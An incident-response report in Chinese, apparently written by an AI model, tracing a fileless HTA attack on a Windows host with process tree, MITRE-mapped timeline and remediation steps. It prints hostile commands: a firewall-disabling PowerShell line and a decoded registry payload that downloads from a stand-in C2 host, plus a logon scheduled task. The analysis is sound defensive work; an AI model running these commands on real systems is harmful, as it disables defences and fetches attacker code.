好的，遵照您的指示。以下是基于调查笔记和MITRE上下文生成的攻击溯源调查报告。

### **攻击溯源调查报告**

#### **事件概览**
2026年6月27日15:05，Agent 002（主机名：windows001）上一名用户通过双击执行了位于桌面的恶意HTA文件，触发了多阶段无文件攻击链。攻击者利用`mshta.exe`作为初始载荷宿主，通过`cmd.exe`编排执行了防御规避、系统侦察、持久化驻留及C2回调等系列操作，最终在`HKCU\SOFTWARE\SystemUpdate`注册表项中植入了Base64编码的远程下载指令，并创建计划任务确保持久化运行。

#### **攻击痕迹与来源分析**
- **失陷主机**：Agent 002 (windows001, IP: 192.168.74.128)
- **初始攻击入口**：用户执行恶意HTA文件 (社交工程/路过式下载)
- **恶意文件/载荷**：
  - `C:\Users\16377\Desktop\noa\advanced_fileless_c2_chain.hta` (初始执行入口)
  - `C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp` (存放网络侦察结果)
- **被利用/篡改的进程**：
  - `rundll32.exe` (PID: 7568) — 用于启动`mshta.exe`
  - `mshta.exe` (PID: 4588) — 核心执行宿主
  - `cmd.exe` (PID: 9832) — 攻击命令编排引擎
  - `powershell.exe` (PID: 3604) — 执行防火墙禁用
  - `ipconfig.exe` (PID: 1876) — 网络配置侦察
  - `reg.exe` (PID: 7668) — 注册表写入持久化载荷
  - `schtasks.exe` (PID: 7908) — 创建计划任务
  - `powershell.exe` (PID: 6024) — C2阶段完成信标
- **网络指标**：
  - IP：`203.0.113.100:8080`
  - 域名/URI：`http://203.0.113.100:8080/payload.bin` (注册表中解码后的下载地址)
  - 域名/URI：`http://203.0.113.100:8080/stage_complete` (C2回调信标地址)

#### **进程执行树**
```
└── PID 7568 (rundll32.exe) @ 2026-06-27 15:05:24.416
    └── PID 4588 (mshta.exe) @ 2026-06-27 15:05:24.416
        ├── PID 9832 (cmd.exe) @ 2026-06-27 15:05:25.540
        │   ├── PID 3604 (powershell.exe) @ 2026-06-27 15:05:25.564
        │   ├── PID 1876 (ipconfig.exe) @ 2026-06-27 15:05:25.572
        │   └── PID 7668 (reg.exe) @ 2026-06-27 15:05:25.594
        ├── PID 8532 (cmd.exe) @ 2026-06-27 15:05:25.604
        ├── PID 7908 (schtasks.exe) @ 2026-06-27 15:05:28.089
        ├── PID 4956 (cmd.exe) @ 2026-06-27 15:05:28.166
        └── PID 6024 (powershell.exe) @ 2026-06-27 15:05:29.277
```

#### **攻击时间线与执行流程**
- **[2026-06-27 15:05:24.416]** - **[初始访问 / T1204.002]**：用户通过`rundll32.exe` (PID: 7568) 的 `url.dll,OpenURL` 功能启动`mshta.exe` (PID: 4588)，执行恶意HTA文件 `advanced_fileless_c2_chain.hta`。此为无文件攻击的初始入口。
- **[2026-06-27 15:05:25.540]** - **[执行 / T1059.003]**：`mshta.exe` 创建`cmd.exe` (PID: 9832) 作为多阶段攻击的编排引擎。
- **[2026-06-27 15:05:25.564]** - **[防御规避 / T1562.001]**：`cmd.exe (PID: 9832)` 启动powershell.exe (PID: 3604)，以隐藏窗口样式执行 `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`，禁用Windows防火墙。
- **[2026-06-27 15:05:25.572]** - **[发现 / T1082]**：`cmd.exe (PID: 9832)` 启动`ipconfig.exe` (PID: 1876) 执行`ipconfig /all`，并将输出重定向至`~WMI_dat8491.tmp`。同时，`route print`命令的输出也被追加至该文件。
- **[2026-06-27 15:05:25.594]** - **[持久化 / T1112]** **及** **[防御规避 / T1027]**：`cmd.exe (PID: 9832)` 启动`reg.exe` (PID: 7668) 在注册表路径`HKCU\SOFTWARE\SystemUpdate`下创建名为`payload`的`REG_SZ`值。该值的数据为经过Base64编码的PowerShell命令，解码后内容为：`$c2='http://203.0.113.100:8080/payload.bin'; Invoke-WebRequest -Uri $c2 -UseBasicParsing | Out-Null; Start-Sleep -s 3`。
- **[2026-06-27 15:05:25.604]** & **[2026-06-27 15:05:28.166]** - **[执行 / T1059.003]**：`mshta.exe` 先后启动`cmd.exe` (PID: 8532) 和`cmd.exe` (PID: 4956) 执行`ping 127.0.0.1 -n`命令，用于在脚本执行流程中插入时间延迟。
- **[2026-06-27 15:05:28.089]** - **[持久化 / T1053.005]**：`mshta.exe` 启动`schtasks.exe` (PID: 7908) 创建名为`SysUpdate_Task`的计划任务。该任务的`触发器`为`onlogon`（用户登录时），`操作`为执行PowerShell命令以解码并执行注册表中存储的Base64载荷，确保持久化。
- **[2026-06-27 15:05:29.277]** - **[指令与控制 / T1105]**：`mshta.exe` 启动powershell.exe (PID: 6024) 向C2服务器 `http://203.0.113.100:8080/stage_complete` 发送HTTP GET请求，作为攻击阶段完成的信标，并可能用于下载下一阶段载荷。

#### **总结与建议**
- **使用的工具**：攻击者完全依赖Windows内置工具（`mshta.exe`, `rundll32.exe`, `cmd.exe`, `powershell.exe`, `reg.exe`, `schtasks.exe`, `ipconfig.exe`）实现了无文件攻击，有效规避了基于签名的传统安全检测。
- **网络行为**：检测到失陷主机成功向外部IP地址 `203.0.113.100:8080` 发起了至少一个HTTP GET请求（`/stage_complete`）。同时，注册表中硬编码了另一个URI (`/payload.bin`)用于下载后续载荷，表明存在活跃的C2通信。
- **横向移动/数据外泄**：当前调查未发现横向移动或数据外泄的直接证据。攻击链主要集中在主机自身的持久化、防御规避和C2建立阶段。
- **用户活动**：事件因用户`16377`手动执行桌面上的HTA文件`advanced_fileless_c2_chain.hta`而触发。
- **关键结论与建议**：
  1. **立即处置**：
     - 隔离主机 `windows001` (192.168.74.128)。
     - 删除或禁用名为 `SysUpdate_Task` 的计划任务。
     - 删除注册表项 `HKCU\SOFTWARE\SystemUpdate`。
     - 在边界防火墙或代理服务器上阻断对 `203.0.113.100:8080` 的所有通信。
  2. **进一步检查**：
     - 检查防火墙日志、DNS日志及代理日志，确认主机是否从`/payload.bin`成功下载了其他文件。
     - 对`advanced_fileless_c2_chain.hta`文件进行深入逆向分析，获取其完整功能和更多IOC。
     - 检查同一时间段内其他主机是否存在针对IP `203.0.113.100`的类似连接。
  3. **长期加固**：
     - 限制普通用户执行`.hta`、`.ps1`等脚本文件的权限。
     - 实施应用程序白名单策略（AppLocker）以阻止未经授权的脚本宿主（如`mshta.exe`）启动。
     - 加强用户安全意识培训，防范含有恶意附件的钓鱼邮件或通过浏览器进行的路过式下载。